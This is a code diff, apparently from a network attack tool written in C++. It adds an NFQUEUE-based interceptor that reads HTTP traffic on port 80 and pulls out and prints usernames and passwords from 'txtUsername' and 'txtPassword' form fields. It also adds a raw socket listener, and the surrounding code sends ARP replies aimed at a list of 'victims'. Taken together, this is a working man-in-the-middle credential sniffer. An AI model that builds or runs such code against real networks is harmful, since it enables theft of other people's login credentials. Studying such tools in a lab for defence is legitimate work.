@@ -2,10 +2,113 @@
 
 using namespace std;
 
-// vector<unsigned char> str2mac(const char *txt, vector<unsigned char> mac){
-//     sscanf(txt, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
-//     return mac;
-// }
+void analyze_packet (char * data, int len) {
+	int c = 0, dport;
+	int iph_len = (((uint8_t) data[0])&0x0F)<<2;
+	int tcph_len = (((uint8_t) data[iph_len+12])&0xF0)>>2;
+    dport = (((uint8_t)data[iph_len+2])<<8)|((uint8_t)data[iph_len+3]);
+	
+    if(dport == 80){
+        string str = "", line, username = "", password = "";
+        for (c = iph_len + tcph_len; c<len; c++) {
+            str += data[c];
+        }
+        stringstream ss(str);
+        while(getline(ss, line, '\n')){
+            if(line.find("txtUsername=") != string::npos){
+                username = line.substr(line.find("txtUsername=") + 12, line.find('&') - line.find("txtUsername=") - 12);
+                password = line.substr(line.find("txtPassword=") + 12, line.find("\n"));
+                break;
+            }
+        }
+        if(username != "" && password != ""){
+            cout << "Username: " << username << '\n';
+            cout << "Password: " << password << '\n';
+        }
+    }
+    // if(dport == 53){
+    //     string str = "", line, domain = "";
+    //     for (c = iph_len + tcph_len; c<len; c++) {
+    //         str += data[c];
+    //     }
+    //     cout << str << '\n';
+    // }
+}
+
+u_int32_t print_pkt (struct nfq_data *tb) {
+	int id = 0;
+	struct nfqnl_msg_packet_hdr *ph;
+	int ret;
+	char *data;
+
+	ph = nfq_get_msg_packet_hdr(tb);
+	if (ph) {
+		id = ntohl(ph->packet_id);
+	}
+
+	ret = nfq_get_payload(tb, reinterpret_cast<unsigned char**>(&data));
+	if (ret >= 0) {
+		analyze_packet (data, ret);
+	}
+
+	return id;
+}
+	
+
+int cb(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *data){
+	u_int32_t id = print_pkt(nfa);
+	return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
+}
+
+void nfq_thread(){
+    struct nfq_handle *h;
+	struct nfq_q_handle *qh;
+	int fd;
+	int rv;
+	char buf[4096] __attribute__ ((aligned));
+
+	//printf("opening library handle\n");
+	h = nfq_open();
+	if (!h) {
+		fprintf(stderr, "error during nfq_open()\n");
+		exit(1);
+	}
+
+	//printf("unbinding existing nf_queue handler for AF_INET (if any)\n");
+	if (nfq_unbind_pf(h, AF_INET) < 0) {
+		fprintf(stderr, "error during nfq_unbind_pf()\n");
+		exit(1);
+	}
+
+	//printf("binding nfnetlink_queue as nf_queue handler for AF_INET\n");
+	if (nfq_bind_pf(h, AF_INET) < 0) {
+		fprintf(stderr, "error during nfq_bind_pf()\n");
+		exit(1);
+	}
+
+	// printf("binding this socket to queue '0'\n");
+	qh = nfq_create_queue(h, 0, &cb, NULL);
+	if (!qh) {
+		fprintf(stderr, "error during nfq_create_queue()\n");
+		exit(1);
+	}
+
+	// printf("setting copy_packet mode\n");
+	if (nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff) < 0) {
+		fprintf(stderr, "can't set packet_copy mode\n");
+		exit(1);
+	}
+
+	fd = nfq_fd(h);
+	while ((rv = recv(fd, buf, sizeof(buf), 0))){
+		nfq_handle_packet(h, buf, rv);
+	}
+
+	nfq_destroy_queue(qh);
+	nfq_close(h);
+	exit(0);
+}
+
 void str2mac(const char *txt, unsigned char *mac){
     sscanf(txt, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
     return;
@@ -24,26 +127,6 @@ int int_ip4(struct sockaddr *addr, uint32_t *ip)
     } else {
         err("Not AF_INET");
         return 1;
-    }
-}
-
-/*
- * Formats sockaddr containing IPv4 address as human readable string.
- * Returns 0 on success.
- */
-int format_ip4(struct sockaddr *addr, char *out)
-{
-    if (addr->sa_family == AF_INET) {
-        struct sockaddr_in *i = (struct sockaddr_in *) addr;
-        const char *ip = inet_ntoa(i->sin_addr);
-        if (!ip) {
-            return -2;
-        } else {
-            strcpy(out, ip);
-            return 0;
-        }
-    } else {
-        return -1;
     }
 }
 
@@ -206,14 +289,6 @@ void thread_reply(const char *ifname, vector<string> vctms, map<string, string> 
     }
 }
 
-// void thread_reply(int ifindex, unsigned char *src_mac, unsigned char *dst_mac, uint32_t src_ip, uint32_t dst_ip){
-//     while(true){
-//         arp_reply(ifindex, src_mac, dst_mac, src_ip, dst_ip);
-//         // sending every 500ms
-//         this_thread::sleep_for(chrono::milliseconds(500));
-//     }
-// }
-
 /*
  * Gets interface information by name:
  * IPv4
@@ -266,6 +341,42 @@ out:
         close(sd);
     }
     return err;
+}
+
+/*
+ * Creates a raw socket that listens for ARP traffic on specific ifindex.
+ * Writes out the socket's FD.
+ * Return 0 on success.
+ */
+int bind_all(int ifindex, int *fd)
+{
+    //debug("bind_arp: ifindex=%i", ifindex);
+    int ret = -1;
+
+    // Submit request for a raw socket descriptor.
+    *fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+    if (*fd < 1) {
+        perror("socket()");
+        goto out;
+    }
+
+    //debug("Binding to ifindex %i", ifindex);
+    struct sockaddr_ll sll;
+    memset(&sll, 0, sizeof(struct sockaddr_ll));
+    sll.sll_family = AF_PACKET;
+    sll.sll_ifindex = ifindex;
+    if (bind(*fd, (struct sockaddr*) &sll, sizeof(struct sockaddr_ll)) < 0) {
+        perror("bind");
+        goto out;
+    }
+
+    ret = 0;
+out:
+    if (ret && *fd > 0) {
+        debug("Cleanup socket");
+        close(*fd);
+    }
+    return ret;
 }
 
 /*
